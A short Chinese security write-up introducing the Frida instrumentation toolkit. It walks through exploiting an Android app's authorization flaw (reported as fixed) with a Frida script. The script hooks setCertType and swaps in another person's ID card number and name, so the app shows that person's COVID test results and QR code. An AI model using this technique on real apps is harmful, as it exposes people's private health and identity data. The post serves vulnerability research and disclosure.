Frida：

Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers。

场景：

Frida可用来对安卓APP中的函数进行HOOK，从而调用APP中的方法、修改函数入参等操作，在漏洞挖掘中可用来对加密传输的数据进行解密等。


案例：

1.经测试，已知该APP存在越权漏洞，可越权查询他人核酸检测结果，通过修改数据包参数中的身份证号与姓名即可查询他人核酸检测结果，现在我们通过Frida HOOK数据包发起之前的函数，篡改数据包参数中的IdCard为他人的身份证号码，致使APP上展示他人的核酸检测结果及核酸验证二维码（目前该漏洞已修复）。


核酸检测结果查询流程一共有两个数据包：

第一个数据包通过idCard查询得到hsjcSign，第二个数据包再通过hsjcSign获取核酸检测结果详情。

可以看到该处代码往getQrcodeBean中set了几个值，虽然代码进行了部分混淆，但可以推测出来getQrcodeBean将被作为HTTP POST包中的参数发送，这也就是核酸结果查询的第一个数据包，在这里我们可直接对setIdCard进行hook，篡改IdCard值即可，但这里我想尝试下hook同一个类之下的某个方法时是否可调用该类中的其他方法，因此我选择setCertType函数进行hook，然后再调用setIdCard传入我预设的IdCard值，对原有IdCard完成覆盖。

正式HOOK代码：

当APP运行到setCertType时，将被Frida HOOK到，自此Frida就获取了该类的实例，可以随意对该类中的方法进行调用，这里我们调用了setIdCard并将我们预设好的值传入，以实现篡改IdCard值的目的，而后续的代码将带着我们篡改后的IdCard发起POST请求，获取该IdCard的hsjcSign值并发起最终查询数据包。

import frida,sys
hookCode = """Java.perform(function () {    var mainClass = Java.use("要HOOK的类名")    mainClass.要HOOK的方法名.implementation = function (content) {        console.log("Hook Start...");        this.setCertType(content);        this.setIdCard("预设的身份证号")        this.setName("预设的姓名")    }});"""

def messagesCallback(message, data):    try:        if message['type'] == 'send':            print("[*] {0}".format(message['payload']))    except:        print("error")        print(message)
process = frida.get_remote_device().attach("APP包名")#process.enable_debugger()script = process.create_script(hookCode)script.on('message', messagesCallback)script.load()sys.stdin.read()
